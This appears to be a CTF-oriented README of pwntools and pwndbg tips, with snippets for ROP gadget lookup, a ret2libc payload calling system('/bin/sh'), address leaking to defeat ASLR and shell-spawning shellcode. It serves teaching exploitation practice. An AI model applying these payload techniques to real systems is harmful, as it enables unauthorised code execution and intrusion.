# Tips and tricks for pwning
<p align="center">
    <img src="Barbaricum.png" alt="Barbaricum Logo">
</p>

So you have finally decided to stop doing everything by hand, counting bytes in your head and writing complex one-liners in bash to exploit binaries. Congratulations, you are now leaving the *barbaricum* and entering the civilized world of exploit development with proper tools! 

This is a basic template for writing exploit scripts using the Pwntools library in Python. It includes common imports, setup for local and remote exploitation, and a structure for defining the exploit logic.

Additionally it shows some neat tricks to make your exploit development easier.

Since many of you are dipping your toes into more serious exploitation, I think it is necessary to share some techniques that will help you in your journey and save you some time.

This is a work in progress, so feel free to contribute with your own tips and tricks!
### Feel free to ping me for additions or open pull request
## pwndbg 
pwndbg is an awesome GDB plugin that enhances the debugging experience for binary exploitation. It provides useful features like automatic context display, heap visualization, and more.
I will skip the installation instructions as many of you already have it installed.

Useful links (cheetsheet):
- https://gist.github.com/Enigmatrix/89b09b4c97d541df3dd9e0d8ace9ed1a 
- https://cheatography.com/cactuarnation/cheat-sheets/gdb-and-pwndbg/

When launching a binary with pwndbg and you want to pass some initial commands to GDB, you can use the following syntax from shell:
```bash
gdb vuln_binary -exec="set follow-fork-mode child" -exec="set detach-on-fork off" --exec="break main"
```
By using the `-exec` flag, you can pass multiple commands to GDB that will be executed in sequence when the debugger starts; this is particularly useful when launching multiple times the same binary and you don't want to type the same commands over and over again.

### Which libc am I using?
When exploiting binaries, it's crucial to know which libc version is being used, by default pwndbg uses the system libc, which might differ from the one used by the target binary, especially in CTF challenges.
To check which libc version is being used by the target binary, you can use the following GDB command:
```gdb
info sharedlibrary
```
This will display a list of shared libraries loaded by the binary, including libc. Look for the path of libc in the output to determine which version is being used.


## pwntools
Pwntools is a powerful library for writing exploit scripts in Python. If used only for basic tasks, it's like using a Ferrari to go to the grocery store, good flex but not really necessary. Let's start with some useful tips and tricks to make the most out of it.

You can find many more details in the official documentation: https://docs.pwntools.com/en/stable/ or in the excellent cheat sheet: https://gist.github.com/anvbis/64907e4f90974c4bdd930baeb705dedf

When launching your exploit script, you can pass arguments to control its behavior. For example, you can use `REMOTE` to indicate that you want to connect to a remote service instead of running the binary locally. You can also use `GDB` to attach GDB to the process for debugging (**you must implement this decision logic**, but don't worry it is easy - shown in the local vs remote section below). 

I highly recommend using these flags to make your exploit scripts more versatile and especially use the `DEBUG` log level to get more insights about what is happening under the hood. For example:
```bash
python3 exploit.py REMOTE DEBUG
```
This will run the exploit against the remote service with debug-level logging enabled showing all the sent and received data.

```bash
python3 exploit.py GDB DEBUG
```
This will run the exploit locally, attach GDB to the process, and enable debug-level logging

Output of the `DEBUG` log level:
<p align="center">
    <img src="DEBUG.png" alt="Pwntools Debug Output">
</p>
As you can see, it provides detailed information about the data being sent and received, which can be invaluable for debugging your exploit.

### Context settings
Setting the context correctly is crucial for writing effective exploit scripts. It helps Pwntools understand the architecture and environment of the target binary. It is also useful for setting the logging level to control the verbosity of the output.

```python
from pwn import *

context.binary = ELF('./vuln_binary')   # Automatically sets architecture, OS, and endianness
libc = ELF('./libc.so.6')               # Load the libc binary if needed
context.log_level = 'debug'             # Set logging level to debug for detailed output - equal to launch with `python exploit.py DEBUG`
```
### Local vs Remote
When developing exploits, it's common to test them locally before deploying them against a remote service. Pwntools makes it easy to switch between local and remote execution.

```python
def get_process():
    if args.REMOTE:
        return remote('example.com', 1337)  # Connect to remote service
    else:
        return remote('localhost', 1337)    # Connect to local service

p = get_process()

```

### Getting addresses and symbols
Pwntools provides convenient methods to retrieve addresses of functions and symbols from the binary and linked libraries
```python
main_addr = context.binary.symbols['main']  # Get address of main function
log.info(f"Main function address: {hex(main_addr)}")

printf_addr = context.binary.plt['printf']   # Get address of printf in the PL
log.info(f"Printf PLT address: {hex(printf_addr)}")

printf_got = context.binary.got['printf']  # Get address of printf in the GOT
log.info(f"Printf GOT address: {hex(printf_got)}")

libc_system= libc.symbols['system']         # Get address of system function in libc 
log.info(f"System function address in libc: {hex(libc_system)}")
```
These symbols, depending on the context, can be offset or absolute addresses.


Similarly, you can get rop gadgets using the ROP module:
```python
rop = ROP(context.binary)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
log.info(f"pop rdi; ret gadget address: {hex(pop_rdi)}")
```
Pay attention that this can be janky at times, I highly recommend to double check the addresses with ropper. If you already found the gadgets manually, you can always hardcode them in the following way:
```python
pop_rdi = p64(0x40123b) # Address of 'pop rdi; ret' gadget
```

### Crafting payloads
Pwntools provides the `flat` function to help you create payloads easily. It automatically handles packing and alignment for you.
```python
payload = flat(
    b'A' *  cyclic_find(0x6161616161616761),  # Offset to return address
    pop_rdi,
    next(context.binary.search(b'/bin/sh\x00')),  # Address of "/bin/sh" string
    libc_system
)
```
Now, this might be a bit advanced for beginners, you can always craft the payload manually using `p64` to pack addresses:
```python
payload = b'A' * 42  # Manual offset to return address
payload += p64(pop_rdi)
payload += p64(address_of_bin_sh)  # address of "/bin/sh" string
payload += p64(libc_system)
```

### Sending and receiving data
Pwntools provides convenient methods to send and receive data from the target process or remote service.
```python
p.sendline(payload)          # Send payload followed by a newline
response = p.recvuntil(b'Expected Prompt')  # Receive data until a specific prompt
log.info(f"Received response: {response}")
```
There are many other methods available for sending and receiving data, such as `send`, `recv`, `recvline`, `recvn`, etc. Refer to the Pwntools documentation for more details. 

### Leaking addresses
When exploiting binaries with ASLR enabled, leaking addresses is often necessary to bypass protections. Pwntools can help you parse leaked addresses easily.
```python
leak = p.recvline().strip()  # Receive a line containing the leaked address
leaked_address = u64(leak.ljust(8, b'\x00')) # Unpack the leaked address
log.info(f"Leaked address: {hex(leaked_address)}")
```
This example assumes the leaked address is 6 bytes long and pads it to 8 bytes for unpacking. Adjust accordingly based on your specific leak format.

### Interactive mode
After sending the exploit payload, you might want to interact with the spawned shell or process. Pwntools provides an easy way to do this.
```python
p.interactive()  # Switch to interactive mode
```
This allows you to interact with the process as if you were using a terminal, which is especially useful for shell exploits.

### Shellcrafting and asm
Pwntools includes a shellcraft module that allows you to generate shellcode for various architectures easily
```python
shellcode = asm(shellcraft.sh())  # Generate shellcode for spawning a shell
log.info(f"Generated shellcode: {shellcode.hex()}")
```
You can then use this shellcode in your payloads as needed, don't forget to set the correct architecture in the context which will be used by the `asm` function. If you have the binary loaded in context, it will be set automatically.

Additionally, you can generate single asm instructions:
```python
pop_rdi_instr = asm('pop rdi; ret')  # Generate machine code for 'pop rdi; ret' instruction
log.info(f"Generated pop rdi; ret instruction: {pop_rdi_instr.hex()}")
```
This can be useful when you know that the injected payload will be executed as code, but for some reason you can't simply inject a shellcode or specific gadgets are not available.

### Attach to GDB
Pwntools makes it easy to attach GDB to your process for debugging. This is particularly useful when developing and testing exploits and you want to inspect the state of the process.
```python
context.terminal = ["tmux", "splitw", "-h"] # my personal preference, to use this launch the script inside a tmux session
if not args.REMOTE and args.GDB:
    gdb.attach(p)
    pause()  # Pause execution to allow GDB to attach
```
This will launch GDB in a new terminal window and attach it to the running process, most likely pwndbg will be inside a strange looking read function, you can exit it with the `fin` command to return to the previous call in the backtrace.

I suggest you to attach GDB right before sending the payload, so you can debug the exploit and see how the process behaves after receiving your payload; you can still launch the program with GDB from the start in another terminal and then use that GDB session instead, the choice is yours.

Depending on the binary behavior, you might need to set some breakpoints or follow forks, for example this is the setup for rop3 challenge:
```python
context.binary = ELF('./rop3')
local_instance = process('./rop3')
context.terminal = ["tmux", "splitw", "-h"]
gdb.attach(local_instance, """
           set follow-fork-mode child
           set detach-on-fork off
           br child
           """)
pause()
p = remote('localhost', 4493)
p.sendline(payload)
p.interactive()
```
Pay attention that, in this case, I've taken no precautions to select which libc to use, meaning that gdb might use the your system libc, not the one provided with the challenge. This might lead to confusion when debugging, so be careful.


